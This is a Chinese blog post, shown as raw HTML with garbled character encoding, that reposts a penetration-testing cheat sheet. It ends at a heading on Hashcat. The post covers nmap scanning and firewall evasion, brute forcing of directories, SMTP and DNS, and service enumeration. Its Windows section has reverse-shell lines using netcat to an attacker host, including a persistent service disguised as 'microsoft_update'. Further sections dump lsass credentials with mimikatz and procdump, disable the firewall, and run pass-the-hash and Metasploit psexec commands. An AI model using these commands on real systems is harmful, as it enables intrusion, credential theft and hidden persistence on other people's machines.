

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/muzihuaner/deng@main/deng.css">
<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/old/F.png">
  <link rel="icon" type="image/png" href="/img/old/F.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="å·¥å…·äººâ€¢å°æ–¹">
  <meta name="keywords" content="">
  <title>æ¸—é€æµ‹è¯•å·¥å…·å®æˆ˜æŠ€å·§åˆé›†[è½¬è½½] - å·¥å…·äººå°æ–¹çš„åšå®¢</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/tomorrow-night.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"fxhstudy.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":"2c3982f360efc29d0de4a57e127e3cb9","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VV0Y0S3Pj6ERI7DEOFLxUFXs-gzGzoHsz","app_key":"r20xk8AR5pft8xGRQlWKYoin","server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  <script src="https://cdn.jsdelivr.net/gh/Sanarous/files@1.13/js/linkcard.js"></script>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="å·¥å…·äººå°æ–¹çš„åšå®¢" type="application/atom+xml">
</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>å·¥å…·äººå°æ–¹çš„åšå®¢</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                ä¸»é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://qiniuyun.fxhstudy.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%8A%80%E5%B7%A7%E5%90%88%E9%9B%86%5B%E8%BD%AC%E8%BD%BD%5D.png?imageslim') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="æ¸—é€æµ‹è¯•å·¥å…·å®æˆ˜æŠ€å·§åˆé›†[è½¬è½½]">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2020-03-18 21:38" pubdate>
        March 18, 2020 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      6.9k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      114
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">æ¸—é€æµ‹è¯•å·¥å…·å®æˆ˜æŠ€å·§åˆé›†[è½¬è½½]</h1>
            
              <p class="note note-info">
                
                  æœ¬æ–‡æœ€åæ›´æ–°äºï¼š8 months ago
                
              </p>
            
            <div class="markdown-body">
              <p>æœ€è¿‘ä¸€ç›´åœ¨å­¦ä¹ ä¸€äº›å…³äºå†…ç½‘æ¸—é€çš„çŸ¥è¯†ï¼Œå­¦ç€å­¦ç€è¶Šæ¥è¶Šå‘ç°è‡ªå·±ä¼šçš„çœŸæ˜¯å°‘å•Šï¼<br>è¿™é‡Œè½¬è½½ä¸€ä½å¤§ä½¬çš„ä¸€äº›æ¸—é€æµ‹è¯•å·¥å…·çš„æ€»ç»“ï¼Œå¯ä»¥è¯´å¯¹äºæˆ‘è¿™ç§è¿˜ç”¨ä¸æ˜ç™½ä¸€äº›å·¥å…·çš„äººæ¥è¯´æ— ç–‘æ˜¯é›ªä¸­é€ç‚­ã€‚<br>è¿™é‡Œæ”¾ä¸ŠåŸæ–‡åœ°å€ğŸ‘‰<a href="https://www.freebuf.com/sectool/105524.html" target="_blank" rel="nofollow">æ¸—é€æµ‹è¯•å·¥å…·å®æˆ˜æŠ€å·§åˆé›†</a></p>
<a id="more"></a>


<p><span style="color: rgb(0, 176, 80);"><b>æœ¬æ–‡ä¸ºä½œè€…æ€»ç»“è‡ªå·±åœ¨æ¸—é€æµ‹è¯•ä¸­å¸¸ç”¨çš„ä¸€äº›å°æŠ€å·§ã€‚åŸæ–‡åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œè¯‘è€…å°†å…¶åˆäºŒä¸ºä¸€ï¼Œæ–¹ä¾¿å¤§å®¶æŸ¥é˜…ã€‚</b></span></p>
<p style="text-align: center;"><span style="color: rgb(0, 176, 80);"><b><a href="https://image.3001.net/images/20160527/14643414135411.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img data-original="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" src="https://image.3001.net/images/20160527/14643414135411.png!small" alt="hacking.png" width="690" style="display: block;"></a><br></b></span></p>
<noscript><img src="https://image.3001.net/images/20160527/14643414135411.png!small" srcset="/img/loading.gif" alt="hacking.png" height="431" width="690"><br /></b></span></p></noscript>
<h3><span id="-nmap">æœ€å¥½çš„ NMAP æ‰«æç­–ç•¥</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># é€‚ç”¨æ‰€æœ‰å¤§å°ç½‘ç»œæœ€å¥½çš„ nmap æ‰«æç­–ç•¥</span>

<p><span class="hljs-comment"># ä¸»æœºå‘ç°ï¼Œç”Ÿæˆå­˜æ´»ä¸»æœºåˆ—è¡¨</span><br>$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24<br>$ grep <span class="hljs-string">â€œStatus: Upâ€</span> Discovery.gnmap | cut <span class="hljs-_">-f</span> 2 <span class="hljs-_">-d</span> <span class="hljs-string">â€˜ â€˜</span> &gt; LiveHosts.txt</p>
<p><span class="hljs-comment"># ç«¯å£å‘ç°ï¼Œå‘ç°å¤§éƒ¨åˆ†å¸¸ç”¨ç«¯å£</span><br><span class="hljs-comment"># <a href="http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf" target="_blank" rel="noopener">http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</a></span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -oG TopTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -oN TopUDP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn â€“top-ports 3674 -oG 3674 -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># ç«¯å£å‘ç°ï¼Œå‘ç°å…¨éƒ¨ç«¯å£ï¼Œä½† UDP ç«¯å£çš„æ‰«æä¼šéå¸¸æ…¢</span><br>$ nmap <span class="hljs-_">-s</span>S -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt<br>$ nmap <span class="hljs-_">-s</span>U -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># æ˜¾ç¤º TCP\UDP ç«¯å£</span><br>$ grep <span class="hljs-string">â€œopenâ€</span> FullTCP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">â€˜ â€˜</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">â€˜/â€˜</span> |xargs | sed <span class="hljs-string">â€˜s/ /,/gâ€™</span>|awk <span class="hljs-string">â€˜{print â€œT:â€$0}â€™</span><br>$ grep <span class="hljs-string">â€œopenâ€</span> FullUDP|cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">â€˜ â€˜</span> | sort -nu | cut <span class="hljs-_">-f</span> 1 <span class="hljs-_">-d</span> <span class="hljs-string">â€˜/â€˜</span> |xargs | sed <span class="hljs-string">â€˜s/ /,/gâ€™</span>|awk <span class="hljs-string">â€˜{print â€œU:â€$0}â€™</span></p>
<p><span class="hljs-comment"># ä¾¦æµ‹æœåŠ¡ç‰ˆæœ¬</span><br>$ nmap <span class="hljs-_">-s</span>V -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># æ‰«åšç³»ç»Ÿæ‰«æ</span><br>$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</p>
<p><span class="hljs-comment"># ç³»ç»Ÿå’ŒæœåŠ¡æ£€æµ‹</span><br>$ nmap -O <span class="hljs-_">-s</span>V -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt<br></code></pre></div></p>
<h3><span id="nmap">Nmap â€“ èº²é¿é˜²ç«å¢™</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># åˆ†æ®µ</span>
$ nmap -f

<p><span class="hljs-comment"># ä¿®æ”¹é»˜è®¤ MTU å¤§å°ï¼Œä½†å¿…é¡»ä¸º 8 çš„å€æ•°(8,16,24,32 ç­‰ç­‰)</span><br>$ nmap â€“mtu <span class="hljs-number">24</span></p>
<p><span class="hljs-comment"># ç”Ÿæˆéšæœºæ•°é‡çš„æ¬ºéª—</span><br>$ nmap -D <span class="hljs-symbol">RND:</span><span class="hljs-number">10</span> [target]</p>
<p><span class="hljs-comment"># æ‰‹åŠ¨æŒ‡å®šæ¬ºéª—ä½¿ç”¨çš„ IP</span><br>$ nmap -D decoy1,decoy2,decoy3 etc.</p>
<p><span class="hljs-comment"># åƒµå°¸ç½‘ç»œæ‰«æ, é¦–å…ˆéœ€è¦æ‰¾åˆ°åƒµå°¸ç½‘ç»œçš„IP</span><br>$ nmap -sI [Zombie IP] [Target IP]</p>
<p><span class="hljs-comment"># æŒ‡å®šæºç«¯å£å·</span><br>$ nmap â€“source-port <span class="hljs-number">80</span> IP</p>
<p><span class="hljs-comment"># åœ¨æ¯ä¸ªæ‰«ææ•°æ®åŒ…åè¿½åŠ éšæœºæ•°é‡çš„æ•°æ®</span><br>$ nmap â€“data-length <span class="hljs-number">25</span> IP</p>
<p><span class="hljs-comment"># MAC åœ°å€æ¬ºéª—ï¼Œå¯ä»¥ç”Ÿæˆä¸åŒä¸»æœºçš„ MAC åœ°å€</span><br>$ nmap â€“spoof-mac Dell/Apple/<span class="hljs-number">3</span>Com IP<br></code></pre></div></p>
<h3><span id="nmap-web">Nmap è¿›è¡Œ Web æ¼æ´æ‰«æ</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse target
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv target
nmap <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan/vulscan.nse â€“script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=vulscan â€“script-args vulscancorrelation=1 -p80 target
nmap <span class="hljs-_">-s</span>V --script=vuln target
nmap -PN <span class="hljs-_">-s</span>S <span class="hljs-_">-s</span>V --script=all â€“script-args vulscancorrelation=1 target
</code></pre></div>
<h3><span id="-dirb">ä½¿ç”¨ DIRB çˆ†ç ´ç›®å½•</span></h3>
<p>æ³¨ï¼š<a href="http://dirb.sourceforge.net/" target="_blank" rel="noopener">DIRB</a> æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºçˆ†ç ´ç›®å½•çš„å·¥å…·ï¼Œåœ¨ Kali ä¸­é»˜è®¤å·²ç»å®‰è£…ï¼Œç±»ä¼¼å·¥å…·è¿˜æœ‰å›½å¤–çš„<a href="https://github.com/lanjelot/patator" target="_blank" rel="noopener">patator</a>ï¼Œ<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a>ï¼Œ<a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project" target="_blank" rel="noopener">DirBuster</a>ï¼Œ å›½å†…çš„å¾¡å‰‘ç­‰ç­‰ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">dirb <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/IP:PORT /usr</span><span class="hljs-regexp">/share/dirb</span><span class="hljs-regexp">/wordlists/common</span>.txt
</code></pre></div>
<h3><span id="patator">Patator â€“ å…¨èƒ½æš´åŠ›ç ´è§£æµ‹è¯•å·¥å…·</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span>

<p><span class="hljs-comment"># SMTP çˆ†ç ´</span><br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> helo=<span class="hljs-string">â€˜ehlo 192.168.17.128â€™</span> user=FILE1 password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst <span class="hljs-number">1</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/usernames</span>.lst<br>$ patator smtp_login host=<span class="hljs-number">192.168</span>.<span class="hljs-number">17.129</span> user=Ololena password=FILE<span class="hljs-number">0</span> <span class="hljs-number">0</span>=<span class="hljs-regexp">/usr/share</span><span class="hljs-regexp">/john/password</span>.lst -x <span class="hljs-symbol">ignore:</span>fgrep=<span class="hljs-string">â€˜incorrect password or account nameâ€™</span><br></code></pre></div></p>
<h3><span id="-fierce-dns">ä½¿ç”¨ Fierce çˆ†ç ´ DNS</span></h3>
<p>æ³¨ï¼šFierce ä¼šæ£€æŸ¥ DNS æœåŠ¡å™¨æ˜¯å¦å…è®¸åŒºåŸŸä¼ é€ã€‚å¦‚æœå…è®¸ï¼Œå°±ä¼šè¿›è¡ŒåŒºåŸŸä¼ é€å¹¶é€šçŸ¥ç”¨æˆ·ï¼Œå¦‚æœä¸å…è®¸ï¼Œåˆ™å¯ä»¥é€šè¿‡æŸ¥è¯¢ DNS æœåŠ¡å™¨æšä¸¾ä¸»æœºåã€‚ç±»ä¼¼å·¥å…·ï¼š<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> å’Œ <a href="https://github.com/TheRook/subbrute/" target="_blank" rel="noopener">SubBrute</a> ç­‰ç­‰</p>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># http://ha.ckers.org/fierce/</span>
$ ./fierce.pl -dns example.com
$ ./fierce.pl â€“dns example.com â€“wordlist myWordList.txt
</code></pre></div>
<h3><span id="-nikto-web">ä½¿ç”¨ Nikto æ‰«æ Web æœåŠ¡</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nikto</span> -C all -h http://IP
</code></pre></div>
<h3><span id="-wordpress">æ‰«æ WordPress</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">git</span> clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan
./wpscan â€“url http://IP/ â€“enumerate p
</code></pre></div>
<h3><span id="http">HTTP æŒ‡çº¹è¯†åˆ«</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">wget http:<span class="hljs-comment">//www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span>
cd httprint_301<span class="hljs-meta-keyword">/linux/</span>
./httprint -h http:<span class="hljs-comment">//IP -s signatures.txt</span>
</code></pre></div>
<h3><span id="-skipfish">ä½¿ç”¨ Skipfish æ‰«æ</span></h3>
<p>æ³¨ï¼šSkipfish æ˜¯ä¸€æ¬¾ Web åº”ç”¨å®‰å…¨ä¾¦æŸ¥å·¥å…·ï¼ŒSkipfish ä¼šåˆ©ç”¨é€’å½’çˆ¬è™«å’ŒåŸºäºå­—å…¸çš„æ¢é’ˆç”Ÿæˆä¸€å¹…äº¤äº’å¼ç½‘ç«™åœ°å›¾ï¼Œæœ€ç»ˆç”Ÿæˆçš„åœ°å›¾ä¼šåœ¨é€šè¿‡å®‰å…¨æ£€æŸ¥åè¾“å‡ºã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs dts">skipfish -m <span class="hljs-number">5</span> -LY -S <span class="hljs-meta-keyword">/usr/</span>share<span class="hljs-meta-keyword">/skipfish/</span>dictionaries/complete.wl -o ./skipfish2 -u http:<span class="hljs-comment">//IP</span>
</code></pre></div>
<h3><span id="-nc">ä½¿ç”¨ NC æ‰«æ</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">nc -v -w 1 target -z 1-1000
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {101..102}; <span class="hljs-keyword">do</span> nc -vv -n -w 1 192.168.56.<span class="hljs-variable">$i</span> 21-25 -z; <span class="hljs-keyword">done</span>
</code></pre></div>
<h3><span id="unicornscan">Unicornscan</span></h3>
<p>æ³¨ï¼š<a href="http://www.unicornscan.org/" target="_blank" rel="noopener">Unicornscan</a> æ˜¯ä¸€ä¸ªä¿¡æ¯æ”¶é›†å’Œå®‰å…¨å®¡è®¡çš„å·¥å…·ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-msf</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>
<span class="hljs-selector-tag">us</span> <span class="hljs-selector-tag">-H</span> <span class="hljs-selector-tag">-mU</span> <span class="hljs-selector-tag">-Iv</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-class">.101</span> <span class="hljs-selector-tag">-p</span> 1<span class="hljs-selector-tag">-65535</span>

<p><span class="hljs-selector-tag">-H</span> åœ¨ç”ŸæˆæŠ¥å‘Šé˜¶æ®µè§£æä¸»æœºå<br><span class="hljs-selector-tag">-m</span> æ‰«æç±»å‹ (<span class="hljs-selector-tag">sf</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">tcp</span>, <span class="hljs-selector-tag">U</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">udp</span>)<br><span class="hljs-selector-tag">-Iv</span> <span class="hljs-selector-tag">-</span> è¯¦ç»†<br></code></pre></div></p>
<h3><span id="-xprobe2">ä½¿ç”¨ Xprobe2 è¯†åˆ«æ“ä½œç³»ç»ŸæŒ‡çº¹</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">xprobe2</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">tcp</span><span class="hljs-selector-pseudo">:80</span><span class="hljs-selector-pseudo">:open</span> <span class="hljs-selector-tag">IP</span>
</code></pre></div>
<h3><span id="-samba">æšä¸¾ Samba</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp">nmblookup -A target
smbclient <span class="hljs-comment">//MOUNT/share -I target -N</span>
rpcclient -U <span class="hljs-string">""</span> target
enum4linux target
</code></pre></div>
<h3><span id="-snmp">æšä¸¾ SNMP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp">snmpget -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
snmpwalk -v <span class="hljs-number">1</span> -c <span class="hljs-keyword">public</span> IP
snmpbulkwalk -v2c -c <span class="hljs-keyword">public</span> -Cn0 -Cr10 IP
</code></pre></div>
<h3><span id="-windows-cmd">å®ç”¨çš„ Windows cmd å‘½ä»¤</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs perl">net localgroup Users
net localgroup Administrators
search dir/<span class="hljs-keyword">s</span> *.doc
<span class="hljs-keyword">system</span>(<span class="hljs-string">"start cmd.exe /k $cmd"</span>)
sc create microsoft_update binpath=<span class="hljs-string">"cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe"</span> start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv <span class="hljs-number">23.92</span>.<span class="hljs-number">17.103</span> <span class="hljs-number">7779</span>
mimikatz.exe <span class="hljs-string">"privilege::debug"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
Procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp
mimikatz.exe <span class="hljs-string">"sekurlsa::minidump lsass.dmp"</span> <span class="hljs-string">"log"</span> <span class="hljs-string">"sekurlsa::logonpasswords"</span>
C:\temp\procdump.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">32</span> ä½ç³»ç»Ÿ
C:\temp\procdump.exe -accepteula -<span class="hljs-number">64</span> -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp <span class="hljs-number">64</span> ä½ç³»ç»Ÿ
</code></pre></div>
<h3><span id="putty">PuTTY è¿æ¥éš§é“</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs css">è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€
<span class="hljs-selector-tag">plink</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-P</span> 22 <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">root</span> <span class="hljs-selector-tag">-pw</span> "1234" <span class="hljs-selector-tag">-R</span> 445<span class="hljs-selector-pseudo">:127.0.0.1</span><span class="hljs-selector-pseudo">:445</span> <span class="hljs-selector-tag">IP</span>
</code></pre></div>
<h3><span id="meterpreter">Meterpreter ç«¯å£è½¬å‘</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span>
<span class="hljs-comment"># è½¬å‘è¿œç¨‹ç«¯å£åˆ°ç›®æ ‡åœ°å€</span>
<span class="hljs-attribute">meterpreter</span> &gt; portfwd add â€“l <span class="hljs-number">3389</span> â€“p <span class="hljs-number">3389</span> â€“r <span class="hljs-number">172.16.194.141</span>
kali &gt; rdesktop <span class="hljs-number">127.0.0.1:3389</span>
</code></pre></div>
<h3><span id="-rdp">å¼€å¯ RDP æœåŠ¡</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">reg add <span class="hljs-string">"hklm\system\currentcontrolset\control\terminal server"</span> /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall <span class="hljs-built_in">set</span> service remoteadmin <span class="hljs-built_in">enable</span>
netsh firewall <span class="hljs-built_in">set</span> service remotedesktop <span class="hljs-built_in">enable</span>
</code></pre></div>
<h3><span id="-windows">å…³é—­ Windows é˜²ç«å¢™</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash">netsh firewall <span class="hljs-built_in">set</span> opmode <span class="hljs-built_in">disable</span>
</code></pre></div>
<h3><span id="meterpreter-vncrdp">Meterpreter VNC\RDP</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta"># https:<span class="hljs-comment">//www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span></span>
run getgui -u admin -p <span class="hljs-number">1234</span>
run vnc -p <span class="hljs-number">5043</span>
</code></pre></div>
<h3><span id="-mimikatz">ä½¿ç”¨ Mimikatz</span></h3>
<p>è·å– Windows æ˜æ–‡ç”¨æˆ·åå¯†ç </p>
<div class="hljs code-wrapper"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/gentilkiwi/mimikatz.git</span>
privilege::debug
sekurlsa::logonPasswords full
</code></pre></div>
<h3><span id="i">è·å–å“ˆå¸Œå€¼</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">git clone https:<span class="hljs-comment">//github.com/byt3bl33d3r/pth-toolkit</span>
pth-winexe -U hash <span class="hljs-comment">//IP cmd</span>

<p>æˆ–è€…</p>
<p>apt-get install freerdp-x11<br>xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</p>
<p>åœ¨æˆ–è€…</p>
<p>meterpreter &gt; run post<span class="hljs-meta-keyword">/windows/</span>gather/hashdump<br><span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7<span class="hljs-symbol">eaee8fb117ad06bdd830b7586c::</span>:<br>msf &gt; use exploit<span class="hljs-meta-keyword">/windows/</span>smb/psexec<br>msf exploit(psexec) &gt; set payload windows<span class="hljs-meta-keyword">/meterpreter/</span>reverse_tcp<br>msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:<span class="hljs-number">8846f</span>7eaee8fb117ad06bdd830b7586c<br>msf exploit(psexec) &gt; exploit<br>meterpreter &gt; shell<br></code></pre></div></p>
<h3><span id="-hashcat">ä½¿ç”¨ Hashcat ç ´è§£å¯†ç </span></h3>
